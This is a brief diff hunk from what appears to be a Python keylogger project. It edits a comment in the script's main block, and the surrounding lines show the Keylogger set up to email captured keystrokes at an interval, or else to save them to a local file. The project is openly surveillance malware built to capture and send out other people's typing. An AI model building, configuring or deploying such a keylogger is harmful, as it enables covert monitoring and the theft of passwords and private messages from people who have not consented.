@@ -109,7 +109,7 @@ class Keylogger:
 
     
 if __name__ == "__main__":
-    #TO CHANGE THE LOCATION FOR USER INPUT TO BE STORED, UNCOMMENT ONE OF THESE BELOW.
+    #TO CHANGE THE LOCATION FOR USER INPUT TO BE STORED, UNCOMMENT ONE OF THESE BELOW. YOU CAN ALSO COMMENT OUT THE METHOD THAT YOU AREN'T GOING TO USE.
     # if you want a keylogger to send to your email
     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
     # if you want a keylogger to record keystrokes to a local file 
